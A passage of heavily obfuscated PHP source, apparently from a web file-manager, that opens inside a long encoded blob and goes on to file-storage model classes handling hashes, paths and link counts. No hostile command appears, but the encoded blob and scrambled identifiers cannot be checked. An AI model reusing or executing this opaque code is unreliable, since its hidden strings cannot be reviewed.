4\264\203\167\141\40\145\227\144\3\143\222\257\7\24\223\174\172\110\214\250\267\136\341\34\254\112\133\246\221\31\122\6\51\137\211\231\165\111\143\245\347\151\104"."\62\225\50\365\361\273\145\27\213\311\136\274\51\62\7\307\236\260\341\6\210\215\47\74\2\113\316\103\315\142\33\353\142\144\162\25\362\315\262\52\64\17\63\121\342\255\233\234\143\141\147\35"."\135\154\25\53\345\124\370\24\311\222\146\64\305\40\15\166\371\52\61\111\220\61\252\63\125\154\157\175\203\167\146\75\15\313\357\337\330\341\14\350\10\332\130\22\30\340\343\55\103\143\240\310".base64_decode('DOVEGVO6oSdWlYT9GGIoiq8nsSjFY0WJlxC+7onJJRmtCwUkqvuMC3RVyqczhLNDDm11Vw==')."\1\264\77\234\371\340\266\103\164\206\132\175\62\35\332\203\256\106\300\67\214\354\230\204\324\22\343\20\52\375\50\311\244\316\101\244\211\21\212\124\324\30\25\173\263\300\221\234\110\116\232\74"."\261\134\31\13\103\45\64\111\15\5\300\211\267\246\26\33\12\160\110\33\333\107\371\163\156\254\301\210\211\64\327\121\267\344\10\313\345\300\151\71\42\124\143\323\121\233\47\361\122\303\72\173"."\xf3\xcf\x4e\xea\x9d\x6d\x9d\x7e\x9e\xd4\xcc\xb7\x27\x15\x94\x8\xcb\x77\x41\xa6\x16\xa9\x8f\xe8\x70\xc0\x1b\xce\x19\x29\x25\x1a\x6b\x8d\x4\x3\xd1\x50\x24\xb1\x4c\x19\xc0\xb7\xaa\x42\x6d\x10\x75\x57\x25\xdb"."\x56\xb5\x84\x3\x1c\xe2\xf1\xc7\xb9\xc1\x89\xec\x98\x2e\x7\x83\xf5\x3e\xee\x7d\x6\x7\xbd\x7d\xe8\x1c\xe1\x4d\xf3\xb3\x96\x25\x4e\x55\x64\x84\xd0\x98\x70\xd5\xe7\x6c\x96\x42\xa5\x5e\x2c\x6b\x31\x8f\x9f\xe6"."\145\313\352\140\211\170\205\322\131\41\377\225\12\27\212\172\171\371\121\35\253\57\112\75\226\52\224\52\364\6\312\127\376\2\161\31\44\227\106\354\221\236\237\254\363\106\176\310\260\14\201\16"."\130\215\121\271\365\100\250\75\322\241\6\242\321\330\12\207\326\257\270\13\50\162\101\112\132\166\337\44\255\214\130\4\372\365\162\263\213\140\326\116\166\215\341\22\256\320\345\223\355\167\26\330".base64_decode('BRa4leXuXGhUcq9WKGqGpUsJ1BPYdHgJp2WzDmep2X4pWnLS24qfUukHWBphdCcvEI+0tg==').base64_decode('Jf/bXTXSwhafkWZqZfy9M/X0EpQd67JvCn9C5Sn/Xfd0HnEJqBJbZswPpkmOTcDT07RITA==')."\45\102\161\125\174\2\161\61\305\321\202\174\13\353\117\103\13\330\6\151\230\335\370\341\210\70\267\340\122\320\10\376\12\75\315\242\103\72\26\50\262\23\16\23\316\41\64\2\23\356\120\245"."\x74\xf9\xd7\x73\x2b\xbf\x3b\xbc\xe7\x95\x7d\x83\x38\x73\xa1\x79\xe4\x66\xa\x95\xec\x15\x63\x42\x31\xee\xbc\x49\x54\x75\xe7\x54\xe8\x0\xca\x56\x84\xc8\x8b\x17\x50\x9a\x94\x3a\xea\xea\x91\x3b\xe6\x51\x16\x32"."\xab\xe\xe2\x3\xc4\x72\x60\x38\x57\xb0\x1d\x27\xfd\x36\xf9\x21\x8c\xb4\x24\x34\x1\xcb\x7f\x8a\x5c\x80\x47\xd7\x9c\x45\xf1\xc2\x36\xb1\xc5\x54\x65\xda\x49\xf0\xb0\x38\xff\x61\x2d\x4b\x33\x37\x5a\x96\xe0\x90"."\x8e\x45\xd9\x68\xb8\xbe\x33\x76\x66\x94\xef\x37\xe5\x59\x27\xf8\x1c\xbf\x85\xa2\x8e\x5c\xa9\x20\xc2\x83\xce\x23\xba\x5d\xee\x12\x8e\x56\xff\xbf\xa9\x48\x33\x13\x92\x41\x59\x67\x23\xe5\x1d\xb2\xdc\xf4\x53\xf0"."\162\330\333\135\306\34\166\172\167\305\51\156\377\166\16\317\166\322\16\43\66\12\144\137\174\316\112\236\62\247\122\12\161\314\255\40\144\4\153\217\365\164\330\101\227\24\226\76\75\225\376\364"."\xc0\x2f\xa3\x86\xee\x4e\x50\x3c\x7\x9f\xac\xe5\xa0\x18\xcc\x18\xd9\x74\x91\x6b\x60\x89\x84\x76\x5d\x48\x1f\x48\x2d\x84\x58\xa\x1a\x73\x40\x4e\x3c\x5f\x86\x18\x4a\x7\x3f\x56\x95\x9c\x1e\x62\x7b\xa1\x4e\x77"."\x5c\xc2\xcb\x99\x20\xbd\x4e\xaf\x4f\xfc\x8e\xdf\x12\x5b\xc8\xb2\x1d\x7e\xc6\x92\x66\x52\x1b\xf0\x50\x50\xc5\x48\x51\xc4\x9a\x47\xe5\xb0\xac\x83\x4f\x46\x81\x32\x99\x84\x30\xcd\xd7\x7b\x91\x54\x80\xb9\xe\x4d"."\173\210\137\113\212\27\335\216\262\244\375\311\321\257\134\173\40\153\366\151\131\120\17\164\274\234\53\242\43\232\316\110\210\243\30\115\362\153\205\202\270\17\221\51\56\372\337\361\50\32\362\272".strrev('ÎavI¹0˜YËÒv~£Š¶ñ»Ó1M”xt¢Ô2÷¡)e}Â&’é9€„…¥R¢1*m’')."\xe5\xec\x8\x1f\xf1\x33\xb6\xbf\xfc\x82\x1d\x6b\x96\x1\x46\xc1\x9a\x3c\xba\x50\x30\x21\xd6\x3a\xe4\xd3\x1d\x14\x50\x16\x2a\x2\x34\x1c\x1b\x19\x83\x12\x62\xb1\xa9\xe7\x50\x82\x29\x64\x8c\xf6\x39\xa9\x92\x13"."\67\360\120\132\311\47\33\205\174\362\23\322\373\371\111\11\307\5\157\40\33\71\22\372\66\156\347\241\345\216\120\231\323\123\266\165\300\343\151\5\67\246\223\172\101\365\210\147\324\237\347\352"."\115\74\332\165\372\265\307\343\340\234\5\77\214\224\235\147\334\107\31\76\255\256\12\161\367\44\47\315\162\241\263\120\101\160\370\150\225\106\15\250\255\334\317\253\64\15\322\270\113\305\254\207"."\150\143\170\230\222\143\105\127\261\16\307\163\356\5\255\340\154\366\13\33\204\107\16\344\44\227\166\142\275\306\205\175\105\166\155\355\56\146\70\140\27\21\140\361\222\217\232\132\56\43\20\253"."\x72\xe9\x86\x99\xb3\xe7\xcb\x12\x13\xb1\x84\xe2\x32\x97\xb9\x42\xa0\x3f\xc0\xe3\x8\xa0\x50\x9c\x60\xa8\x30\xfb\xce\xf2\xee\x27\x99\xce\x57\x33\xe5\x7e\x89\x5d\x14\xe0\xbf\xb7\x61\xc4\xe1\x83\x16\x95\x14\x71"."\313\75\270\227\315\0\201\123\111\35\114\42\210\56\275\37\23\253\342\130\142\327\121\22\50\274\21\73\277\105\331\207\12\343\220\350\236\330\54\324\263\254\231\305\7\367\34\276\20\260\213\232".base64_decode('8zxa6dhFZoKd8bBMV8ScmlEgohHZ0rlMbtE23fIlXB3TRSIrjeWzQLaxjQmx2yRM9N9YQA==').strrev('¸ç`\'ºbÈÇn¤ù%8	^Ù«ÒÑøôåÏ™…%„^'."\n".'™¡„¿Ág;™8ï‡†¡1§¢Äv')."\135\315\243\152\242\215\136\217\62\131\241\162\166\117\162\66\54\354\32\112\214\36\256\315\136\210\117\42\100\40\17\224\235\54\223\354\13\225\274\356\25\6\170\310\326\165\154\143\311\234\272\374"."\72\226\64\44\357\217\362\246\45\317\262\102\354\104\344\124\60\42\330\334\104\203\202\164\63\320\312\337\126\153\222\176\237\123\26\6\314\235\344\26\35\115\237\344\71\334\224\303\222\307\142\104"."\x13\x62\xec\x7d\x4\xea\x8e\xe3\x18\x8b\xe2\x21\x97\x57\x79\x82\xbf\xdc\xae\xe6\xd9\x9c\x11\xa4\x21\xf0\xa1\xf4\x66\xdf\x71\x54\xe2\xce\x36\x1d\x47\x27\xcb\xed\x71\x17\xb1\x82\xe\xf7\x1f\xe9\x32\x27\xe5\x80"."\x38\xc9\xb\x39\xfa\x35\x89\xf4\xa\x2a\x2b\x42\x1d\xa5\x9c\x88\x48\x12\x65\x72\xde\xe2\x99\xe\xd3\x6\xd8\x7a\x9f\xb\x47\x30\x83\x9\x96\xcb\x11\x37\xb5\xf\x4e\xc3\xec\x58\xf0\x3f\x76\x36\xfb\xff\xca\xc7".base64_decode('7GzuOcbhm74VmHPoLb5g5bIOKnd2jcNJXg8DKEKT7xsSSIXEuZY4s+DIDDtq7P5Ny2YlIg==')."\134\371\70\123\346\1\34\1\337\40\367\32\135\51\342\176\377\353\366\6\336\115\304\276\314\321\167\157\245\202\2\57\361\123\123\5\70\246\111\214\131\26\70\51\157\244\6\53\134\236\23\55".base64_decode('Wac9f4k5KSsm+oB4GGYa089CKXxcJGZgYPbkp/qxAjtY1gIV6F3CsBUxDwJIS0ZUjqQy9A==').base64_decode('lnSsiSNRnm6Bg3xsOR012l3OjWkhS55bx31BuS5FeW2OB+QqWDnfKRrDC4w75q3zuhLqvQ==')."\xae\xe6\xb8\x7f\x67\x27\xac\x3b\x1c\xe\x53\xfd\x13\xb4\x41\xe2\x58\x4\xc2\x44\x61\xe4\xca\x89\xdc\x3d\x7b\xcb\xeb\x50\xb8\x4e\x88\x32\x93\xec\xac\xca\xfb\x9b\x77\x4a\x88\x3\x71\x48\x9e\xf\x86\x27\x3a\x8b"."\x26\x61\x14\x9d\xa9\x5c\x2c\x24\xe9\x4b\xa7\x24\x99\xab\x9b\xf7\xa3\xc9\x53\x7d\x65\x54\x8b\xa1\x4c\xc7\x4a\x61\x85\x3d\x71\xd5\x99\x8c\xc5\xc3\xea\x8a\x8\x36\x2b\x11\x39\x3d\xdc\xc5\xc\x22\x1b\x26\xf1\x17"."\xc2\x9a\xec\x6a\xaf\x21\x2f\xd3\x60\x3\xa0\x53\x4c\x8b\x29\x40\x49\x47\xc8\x4c\x12\x0\xb\xab\xbe\x76\xae\x10\xe4\x17\xb3\xce\xf7\xcd\xd2\x2b\x8\x66\x53\x4b\x16\x49\x3a\xb\xe3\xa7\x2c\xce\xbd\xb8\xa8\x52".base64_decode('sZRZtGSTmI5MzHaZKDfOztFdebSR9ZStpxVMwB08ffesupm9n9cKyuclZ31BSThcJGZ6mQ==')."\x6e\x2f\x2b\x53\xb1\x9e\x49\x6d\xe0\x54\xca\x43\xb0\x99\xb0\x1d\x40\x24\x9c\xcd\xb8\x9d\xcc\xb4\x38\xec\x4b\x35\x4a\x22\x52\x85\x58\xda\x2\xdf\x43\x93\xac\x4d\x87\x19\x14\xac\x85\x2b\xf\xa3\x86\xc9\x73\xf1"."\351\224\337\76\63\337\44\130\157\316\217\15\161\341\307\31\176\2\177\40\331\136\245\346\124\246\106\204\145\2\102\262\103\60\156\371\231\20\276\144\27\107\143\305\170\216\277\311\40\322\34\52"._kodDe('KmWUXbxPNEI0YobFwx9VaOE5yj0mpyYBsDwhs+vfwvJrqVrygICJiJxeQf8l3KIzC4OzJ/w=').base64_decode('SCSb3mEFhjRuacxdq8txkJUu61MEQ4TL72PFNbHEPbJq+CQsCLsrXcKoguZpQ4IXFmexdA==').base64_decode('ukUbqlA0rbstxaEUXpTw0pLdDPFQRh+Wvw7lxDsWR8HyVGFXQ6ov7uDEMHFapeETDOesLg==').base64_decode('2+3gQCWSqPslrtkinXux6o9QeaFD4eId8UmnlRBejK8ZKkNe0Xkdqa6TPJakMT7QlQWyJQ==')."\251\371\212\42\50\11\4\364\154\124\152\116\276\237\237\264\102\242\362\107\4\124\72\247\130\62\257\42\62\30\313\142\72\46\137\242\131\174\140\120\62\56\147\72\272\343\136\132\162\360\24\340"."\x4b\x13\x73\x44\x8c\x4f\xf3\x2\xce\x2c\x5a\x5e\x77\xf5\x5e\xae\xe0\x1e\x19\xad\xe1\xf0\xd3\x27\xa7\xf\x1b\x76\x2a\x23\x9d\x92\xcb\x33\xcb\xd3\x8b\x65\x93\xd\x1d\xa8\x3c\xe\x77\x6f\xd9\x5c\xbb\x65\x7\xa2"._kodDe('MKB/NuwtuKE3CzCRyMN4BFYXnBX8qHw6gZzvoTnLXlqgp0RMWis3GUmBR5364GoELpyDTh4=')."\x21\xb1\x91\x8a\x4e\x36\x9f\x15\xb\x97\x7f\xe\x20\xd1\x5d\x9a\x8\xaf\x2a\xf7\x42\xc8\x9c\x5c\xea\x16\x95\x7a\x51\xb1\xf0\xa4\xbd\x70\x97\x16\x3c\x7\x3e\x81\x56\xca\x71\xe8\x2c\x39\x29\x4a\x25\xbc\xcd\x72".base64_decode('KmBqioUmVWYSCj7lJEPkVVA3op/E3I9skrFCtqy7VFm7KV4Ry1hOtSNXujxBYDQcOGgAYA==').base64_decode('xIJljUGh1sledUx1kJJSfjBvcvKUFlq7mHMKFN3zXNaaE/TzJcl8e8VHJh4sGCoXwWQ1/g==').strrev('e'."\r".'ã„ÀHæ$öĞÆ\\YI(¹L‡*b%Ú’²GÙóHÌ¶^#iİ)i³3Ñ¾hOÚ').base64_decode('SeAOi15/B7FOBr/4JIbKKQmn2QmzaHtwXtIskN9m07aFNgmVCxE2G9Nhj6QshULilhN3ig==')."\134\237\21\260\45\30\213\4\341\42\36\13\134\22\72\315\45\170\316\21\301\327\162\74\42\223\131\270\220\157\51\271\124\6\104\302\240\231\356\63\107\230\71\104\4\127\322\44\211\213\73\315"."\315\133\12\266\10\100\121\126\375\42\346\104\54\77\315\361\203\103\42\57\151\3\374\217\372\326\24\6\34\325\251\17\107\256\270\375\171\55\200\360\136\64\101\275\221\20\111\52\274\121\113\44"."\x13\x65\x59\x9d\x81\x44\x62\x45\x2c\x1e\xa2\xce\x4b\xca\xb2\x49\x2d\x49\xc1\xae\x2c\xab\xb3\x2d\xd6\x31\x59\x5e\xb8\x3d\x10\x89\x96\xe5\x61\x5d\xbc\xe\x55\x18\xd6\xa4\x59\x91\x4e\xd2\x4b\x72\xf7\x3c\x59\x2f"."\x22\xc1\x65\xa2\x27\xe5\xf6\x4c\xd9\x5d\x59\x14\x9c\x52\x8a\x75\x91\xee\x8e\xa\x19\x93\x5d\x9\xb1\xf2\x9\x2d\xcb\x84\x41\xd2\xdd\x82\x9e\x13\x96\x57\x45\x1d\xa7\x8c\x4b\x5e\x7f\x8b\x99\x48\xe6\x1\xa7\xc7"."\100\227\152\54\3\154\150\10\153\326\165\100\333\361\2\244\142\247\57\34\77\160\76\137\176\337\53\124\75\174\16\225\20\51\235\354\47\202\240\44\70\225\151\77\111\230\136\161\262\344\173\207".base64_decode('8jsxkismA3dyqQmKm2vMPunOi5644L05TK+kSUnDjmxbG6ioGUHFyRhjCEHv/wEWcFJaWA==')."\271\0\0"."".base64_decode(''), 10, -8))); goto F÷æç¢º°ˆ; cÅ„Ç‡¸êÄ: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\x6c\145\x5f\x63\157\156\x74\x65\156\164\163"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\124\151\155\145", "\164\x69\155\145", "\x69\156\163\x65\162\x74", "\x66\x75\x6e\143\164\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\154\145"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\141\155\x65" => "\151\x6f\x5f\x66\151\x6c\145\x5f\x6d\145\x74\141", "\155\x65\164\x61\x46\x69\x65\154\144" => "\x66\151\x6c\x65\111\104"); public function fileInfo($ËÂÜÈ‘“) { $á‚Ğ¨Ø =& $_SERVER[÷ôÚîå]; static $ üšÉì = array(); if (!isset($ üšÉì[$ËÂÜÈ‘“])) { $„ıÛÍ¶ä = $á‚Ğ¨Ø[2028]; $Â¨èÇô = Model($á‚Ğ¨Ø[553])->field($„ıÛÍ¶ä)->where(array($á‚Ğ¨Ø[551] => $ËÂÜÈ‘“))->find(); $ üšÉì[$ËÂÜÈ‘“] = $Â¨èÇô; } return $ üšÉì[$ËÂÜÈ‘“]; } public function addFileByContent($é”ÑµË– = '', $ ÈíğŠÈ = '') { $ôÊë¯œÚ =& $_SERVER[÷ôÚîå]; $ù¿Áìï¿ = TEMP_PATH . $ôÊë¯œÚ[2029]; if (!is_dir($ù¿Áìï¿)) { mk_dir($ù¿Áìï¿); } $‘–„¼­Î = $ù¿Áìï¿ . $ôÊë¯œÚ[2030] . rand_string(16); file_put_contents($‘–„¼­Î, $é”ÑµË–); $ŠßıÄµ’ = $this->addFile($‘–„¼­Î, $ ÈíğŠÈ, !0); if (file_exists($‘–„¼­Î)) { @unlink($‘–„¼­Î); } return $ŠßıÄµ’; } public function createFileName($şÄµî†, $ğ»„ûå = false, $©˜Ğ°íÀ = false) { $ØÌ“ĞÎ =& $_SERVER[÷ôÚîå]; $íÊÊöÔò = IO::init($ØÌ“ĞÎ[8]); $ÒÕ§ı· = $this->makeFilePath($şÄµî†, $íÊÊöÔò, $ğ»„ûå, $©˜Ğ°íÀ); $“¨¤ñô = $íÊÊöÔò->pathFather($ÒÕ§ı·); static $»±²ıÙ× = false; $°ğüãÑ¿ = $ØÌ“ĞÎ[2031] . md5($“¨¤ñô); if (!$»±²ıÙ× && !Cache::get($°ğüãÑ¿)) { $»±²ıÙ× = !0; $¾Ş’£­ = IO::mkdir($“¨¤ñô); if (!IO::exist($¾Ş’£­ . $ØÌ“ĞÎ[886])) { IO::mkfile($¾Ş’£­ . $ØÌ“ĞÎ[886]); } Cache::set($°ğüãÑ¿, 1, 3600 * 2); } return $ÒÕ§ı·; } public function makeFilePath($¯é ş‘, $ß¬À˜µ›, $Æ³÷±¨Ø = false, $£ôà‡ø = false) { $÷ĞÊğÚ› =& $_SERVER[÷ôÚîå]; $ü«ˆÀï• = Model($÷ĞÊğÚ›[859])->get($÷ĞÊğÚ›[2032]); $¹à…¡† = KodIO::defaultIO() . date($÷ĞÊğÚ›[2033]); $õÍ•İÚÎ = $¹à…¡† . rand_string(5) . short_id(100); $¯é ş‘ = str_replace($÷ĞÊğÚ›[8], $÷ĞÊğÚ›[11], KodIO::clear($¯é ş‘)); $èã €è‘ = $ß¬À˜µ›->ext($¯é ş‘); if (!$¯é ş‘) { $ü«ˆÀï• = $÷ĞÊğÚ›[865]; } switch ($ü«ˆÀï•) { case $÷ĞÊğÚ›[2034]: if ($èã €è‘) { $õÍ•İÚÎ = $õÍ•İÚÎ . $÷ĞÊğÚ›[10] . $èã €è‘; } if ($èã €è‘ == $÷ĞÊğÚ›[1970]) { $õÍ•İÚÎ .= $÷ĞÊğÚ›[1302]; } break; case $÷ĞÊğÚ›[2035]: $æÜøô± = Model($÷ĞÊğÚ›[859])->get($÷ĞÊğÚ›[860]); $†òª˜Ùš = substr(md5($÷ĞÊğÚ›[861] . $æÜøô± . date($÷ĞÊğÚ›[838])), 0, 8); $ÄÓ•ˆ¡Ó = KodIO::defaultDriver(); $¹à…¡† = $÷ĞÊğÚ›[1333] . $ÄÓ•ˆ¡Ó[$÷ĞÊğÚ›[484]] . $÷ĞÊğÚ›[493] . date($÷ĞÊğÚ›[2036]) . $†òª˜Ùš . $÷ĞÊğÚ›[8]; if ($èã €è‘ == $÷ĞÊğÚ›[1970]) { $¯é ş‘ .= $÷ĞÊğÚ›[1302]; } $üÚ‹İÓœ = $÷ĞÊğÚ›[2037] . $¹à…¡† . $¯é ş‘; CacheLock::lock($üÚ‹İÓœ); $õÍ•İÚÎ = $¹à…¡† . $¯é ş‘; if (IO::exist($¹à…¡† . $¯é ş‘)) { $ËŸ¨åÆ = substr($¯é ş‘, 0, strlen($¯é ş‘) - strlen($èã €è‘)); $ğŸÌ°Èó = $£ôà‡ø ? substr($£ôà‡ø, 0, 5) : ($Æ³÷±¨Ø ? substr($Æ³÷±¨Ø, 0, 5) : rand_string(5)); $õÍ•İÚÎ = $¹à…¡† . $ËŸ¨åÆ . $ğŸÌ°Èó; if ($èã €è‘) { $õÍ•İÚÎ = $õÍ•İÚÎ . $÷ĞÊğÚ›[10] . $èã €è‘; } } if (IO::isOsDriver($õÍ•İÚÎ) && !IO::isUploadServer($õÍ•İÚÎ)) { if (IO::exist($õÍ•İÚÎ)) { return $õÍ•İÚÎ; } $ß’ÒÎ˜ = IO::setContent($õÍ•İÚÎ, $÷ĞÊğÚ›[12]); if (!$ß’ÒÎ˜) { show_json($÷ĞÊğÚ›[2038], !1); } } CacheLock::unlock($üÚ‹İÓœ); break; case $÷ĞÊğÚ›[865]: break; default: break; } return $õÍ•İÚÎ; } public function addFileByRemote($ºÙ³ˆÂ„, $ı†ìÉñ, $ƒ…õãæò = array()) { $ı„¶«ìß =& $_SERVER[÷ôÚîå]; if (!IO::exist($ºÙ³ˆÂ„)) { return !1; } $Ä¥ØÙ…µ = $ƒ…õãæò[$ı„¶«ìß[556]] ? $ƒ…õãæò[$ı„¶«ìß[556]] : $ı„¶«ìß[12]; $¿‡Şİ²á = IO::hashMd5($ºÙ³ˆÂ„, $Ä¥ØÙ…µ); $ø´¾³‚æ = KodIO::defaultDriver(); $ê‘©•»£ = array($ı„¶«ìß[626] => IO::size($ºÙ³ˆÂ„), $ı„¶«ìß[2039] => 1, $ı„¶«ìß[503] => $ı†ìÉñ, $ı„¶«ìß[898] => $ø´¾³‚æ[$ı„¶«ìß[484]], $ı„¶«ìß[504] => $ºÙ³ˆÂ„, $ı„¶«ìß[2040] => $ƒ…õãæò[$ı„¶«ìß[681]] ? $ƒ…õãæò[$ı„¶«ìß[681]] : IO::hashSimple($ºÙ³ˆÂ„), $ı„¶«ìß[2041] => $¿‡Şİ²á ? $¿‡Şİ²á : $Ä¥ØÙ…µ); if ($“Ç¨ÓÜ = $this->addFileCheckExist($ê‘©•»£[$ı„¶«ìß[681]], $ê‘©•»£[$ı„¶«ìß[556]], $ê‘©•»£[$ı„¶«ìß[89]])) { return $“Ç¨ÓÜ; } return $this->addFileData($ê‘©•»£); } private function addFileData($î‹»şé) { $Ä²¼Ÿéş =& $_SERVER[÷ôÚîå]; if (!$î‹»şé) { return !1; } $î‹»şé[$Ä²¼Ÿéş[89]] = intval($î‹»şé[$Ä²¼Ÿéş[89]]); if (!$î‹»şé[$Ä²¼Ÿéş[89]] && strlen($î‹»şé[$Ä²¼Ÿéş[681]]) > 32) { $î‹»şé[$Ä²¼Ÿéş[89]] = intval(substr($î‹»şé[$Ä²¼Ÿéş[681]], 32)); } $İ“Ò‹‚ = $this->add($î‹»şé); return $this->find($İ“Ò‹‚); } public function addFile($ÚÓûñÏ¸, $€‹á–¥Ã, $°ˆóÒ“Ù = false) { $¬í…á¿Ú =& $_SERVER[÷ôÚîå]; $ßş¡äÕ° = IO::hashSimple($ÚÓûñÏ¸); $ù°ÂµƒÇ = IO::size($ÚÓûñÏ¸); $“ˆŒê£ø = $ù°ÂµƒÇ <= 1024 * 1024 * 10 ? IO::hashMd5($ÚÓûñÏ¸) : $¬í…á¿Ú[12]; $¹ğÀËË = $¬í…á¿Ú[2042] . $ßş¡äÕ°; CacheLock::lock($¹ğÀËË); if ($“ˆŒê£ø && $ßş¡äÕ°) { $°ˆÜÇËñ = $this->addFileCheckExist($ßş¡äÕ°, $“ˆŒê£ø, $ù°ÂµƒÇ); if ($°ˆÜÇËñ) { CacheLock::unlock($¹ğÀËË); return $°ˆÜÇËñ; } } $øØæË€· = $this->addFileMake($ÚÓûñÏ¸, $ù°ÂµƒÇ, $ßş¡äÕ°, $“ˆŒê£ø, $€‹á–¥Ã, $°ˆóÒ“Ù); $Ìç®Í˜À = $this->addFileData($øØæË€·); CacheLock::unlock($¹ğÀËË); if (!$“ˆŒê£ø && $Ìç®Í˜À) { $this->fileMd5Check($Ìç®Í˜À); } return $Ìç®Í˜À; } public function fileMd5Check($ı½„º¦¥) { $ÚÒ—ÓÕÃ =& $_SERVER[÷ôÚîå]; $ü“ˆÃÜö = array($ı½„º¦¥[$ÚÒ—ÓÕÃ[550]], $ı½„º¦¥[$ÚÒ—ÓÕÃ[97]]); $¢ß€ïƒ = $ÚÒ—ÓÕÃ[2043] . $ı½„º¦¥[$ÚÒ—ÓÕÃ[97]]; $‹Œ›ÅÛ = $ÚÒ—ÓÕÃ[2044] . $ı½„º¦¥[$ÚÒ—ÓÕÃ[550]]; TaskQueue::add($ÚÒ—ÓÕÃ[2045], $ü“ˆÃÜö, $¢ß€ïƒ, $‹Œ›ÅÛ); } public function fileMd5Set($¬±ë™„Ê, $‰èä¢) { $×‘®¸ =& $_SERVER[÷ôÚîå]; $“¢ŒÊÈé = $this->find($¬±ë™„Ê); if (!$“¢ŒÊÈé || $“¢ŒÊÈé[$×‘®¸[556]]) { return; } $¢â†š×« = IO::hashMd5($‰èä¢); if (!$¢â†š×«) { return $×‘®¸[12]; } $this->where(array($×‘®¸[550] => $¬±ë™„Ê))->save(array($×‘®¸[556] => $¢â†š×«)); } public function addFileMake($Ó¥ëÏ¬Œ, $¢¡¼èò†, $îüĞùŒİ, $Ë¼…áì, $­§ÍÇ’, $„Ğ€¢ê ) { $ó…óêœ =& $_SERVER[÷ôÚîå]; $îÚ›Ä»Œ = $this->createFileName($­§ÍÇ’, $îüĞùŒİ, $Ë¼…áì); $îæí’ÒÇ = get_path_father($îÚ›Ä»Œ); $óğÔ¢— = get_path_this($îÚ›Ä»Œ); if ($„Ğ€¢ê ) { $öÎªâ = IO::move($Ó¥ëÏ¬Œ, $îæí’ÒÇ, !1, $óğÔ¢—); } else { $öÎªâ = IO::copy($Ó¥ëÏ¬Œ, $îæí’ÒÇ, !1, $óğÔ¢—); } if (!$öÎªâ) { return !1; } $ò¦Å¬ÖÃ = KodIO::defaultDriver(); $Æ•¼æĞ = array($ó…óêœ[626] => $¢¡¼èò†, $ó…óêœ[2039] => 1, $ó…óêœ[503] => $­§ÍÇ’, $ó…óêœ[898] => $ò¦Å¬ÖÃ[$ó…óêœ[484]], $ó…óêœ[504] => $îÚ›Ä»Œ, $ó…óêœ[2040] => $îüĞùŒİ, $ó…óêœ[2041] => $Ë¼…áì); return $Æ•¼æĞ; } public function addFileCheckExist($†­ï«Ô¯, $Î€ôÏ¾ç, $ÃŒøÈúØ) { $Ã©Èƒº© =& $_SERVER[÷ôÚîå]; $û‡å±òÍ = $this->findByHash($†­ï«Ô¯, $Î€ôÏ¾ç); if (!$û‡å±òÍ) { return !1; } $½›µë³ = array($Ã©Èƒº©[2039] => intval($û‡å±òÍ[$Ã©Èƒº©[2046]]) + 1, $Ã©Èƒº©[626] => $ÃŒøÈúØ); $this->where(array($Ã©Èƒº©[551] => $û‡å±òÍ[$Ã©Èƒº©[550]]))->save($½›µë³); return $û‡å±òÍ; } public function remove($ÂÀŠÒ†¿) { $this->linkCountChange($ÂÀŠÒ†¿, !1); $this->clearEmpty(); return !0; } public function linkAdd($æëîÊ¨Ö) { $this->linkCountChange($æëîÊ¨Ö, !0); } public function linkCountChange($¯¿éÇõ˜, $Åü‡¦¶) { $“¬ÍÔ® =& $_SERVER[÷ôÚîå]; if (!$¯¿éÇõ˜) { return; } if (!is_array($¯¿éÇõ˜)) { $¯¿éÇõ˜ = array($¯¿éÇõ˜); } $±ƒ­£… = array(); foreach ($¯¿éÇõ˜ as $½îÃËÏ—) { $¤øÍ ë  = $½îÃËÏ— . $“¬ÍÔ®[12]; if (!$±ƒ­£…[$¤øÍ ë ]) { $±ƒ­£…[$¤øÍ ë ] = 0; } $±ƒ­£…[$¤øÍ ë ]++; } $½ñ ×» = array(); foreach ($±ƒ­£… as $½îÃËÏ— => $Äö­ñ’÷) { $¤øÍ ë  = $Äö­ñ’÷ . $“¬ÍÔ®[12]; if (!$½ñ ×»[$¤øÍ ë ]) { $½ñ ×»[$¤øÍ ë ] = array(); } $½ñ ×»[$¤øÍ ë ][] = $½îÃËÏ—; } foreach ($½ñ ×» as $Äö­ñ’÷ => $‡àõûâÔ) { if (!$‡àõûâÔ) { continue; } $Äö­ñ’÷ = $Åü‡¦¶ ? $Äö­ñ’÷ : -intval($Äö­ñ’÷); $ş‚½÷Æ‰ = array($“¬ÍÔ®[550] => array($“¬ÍÔ®[7], $‡àõûâÔ)); if ($Äö­ñ’÷ < 0) { $ş‚½÷Æ‰[$“¬ÍÔ®[2046]] = array($“¬ÍÔ®[1104], abs($Äö­ñ’÷)); } $this->where($ş‚½÷Æ‰)->setAdd($“¬ÍÔ®[2046], $Äö­ñ’÷); } } public function findByHash($“ªËÉÀ€, $ÌæÍùÛş = false) { $€¶¶†µŸ =& $_SERVER[÷ôÚîå]; if (!$“ªËÉÀ€ && !$ÌæÍùÛş) { return !1; } $†®ÅÂåà = array($€¶¶†µŸ[2040] => $“ªËÉÀ€); if ($ÌæÍùÛş) { $†®ÅÂåà = array($€¶¶†µŸ[2041] => $ÌæÍùÛş); } return $this->order($€¶¶†µŸ[2047])->where($†®ÅÂåà)->find(); } public function clearEmpty($´¾¨¤‰ = 0) { $°×ò‹æ¨ =& $_SERVER[÷ôÚîå]; $ö•ğÉÂİ = time() - 3600 * 24 * $´¾¨¤‰; $ŒÀïÚØÒ = $°×ò‹æ¨[2048] . $ö•ğÉÂİ; $·Ë£ªñ„ = $this->where($ŒÀïÚØÒ)->select(); if (!$·Ë£ªñ„) { return; } $¸¢ ›·¡ = new Task($°×ò‹æ¨[2049], $°×ò‹æ¨[12], count($·Ë£ªñ„)); foreach ($·Ë£ªñ„ as $À³ªéŸ) { $¸¢ ›·¡->update(1); $this->resetFile($À³ªéŸ); } $¸¢ ›·¡->end(); } public function resetFile($åñ°ÄÂï) { $¤‹ŒŒš¬ =& $_SERVER[÷ôÚîå]; $ü³µİË¼ = array($¤‹ŒŒš¬[551] => $åñ°ÄÂï[$¤‹ŒŒš¬[550]]); $®„¬«±œ = Model($¤‹ŒŒš¬[1429])->where($ü³µİË¼)->count(); $®°Ñô…Í = Model($¤‹ŒŒš¬[2050])->where($ü³µİË¼)->count(); $Ó”ØÒÇ— = intval($®„¬«±œ) + intval($®°Ñô…Í); if ($Ó”ØÒÇ— == 0) { 